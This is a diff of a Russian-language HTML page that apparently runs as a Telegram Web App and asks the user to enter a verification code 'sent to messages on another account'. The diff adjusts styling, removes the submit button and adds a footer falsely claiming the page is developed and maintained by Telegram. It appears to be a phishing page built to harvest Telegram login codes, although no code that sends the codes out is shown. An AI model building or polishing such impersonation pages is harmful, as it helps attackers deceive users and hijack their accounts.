@@ -27,14 +27,14 @@
             font-family: 'Telegram', sans-serif;
             font-size: 28px;
             margin-bottom: 10px;
-            font-weight: 700;
+            font-weight: 1000;
         }
         p {
             color: var(--tg-theme-text-color);
             font-family: 'Telegram', sans-serif;
             font-size: 18px;
             margin-bottom: 20px;
-            font-weight: 700;
+            font-weight: 550;
         }
         input[type="text"] {
             width: 50px;
@@ -52,7 +52,7 @@
         }
         .emoji {
             font-size: 52px;
-            margin-bottom: 0px;
+            margin-bottom: 100px;
         }
         button {
             padding: 10px 20px;
@@ -64,11 +64,16 @@
             font-family: 'Telegram', sans-serif;
             font-size: 18px;
         }
+        a{
+            font-size: 10px;
+            color: var(--tg-theme-hint-color);
+            margin-top: 30vh;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <span class="emoji" style="font-size: 100px;">📩</span>
+        <span class="emoji" style="font-size: 100px;">💬</span>
         <h1>Введите код</h1>
         <p>Мы отправили SMS с кодом проверки в сообщения на другом аккаунте</p>
         <form>
@@ -79,8 +84,8 @@
                 <input type="text" size="1" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive; margin-left: 10px;">
                 <input type="text" size="1" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive; margin-left: 10px;">
             </div>
-            <button>Дальше</button>
         </form>
+        <a>Разработано и обслуживается Telegram</a>
     </div>
 </body>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
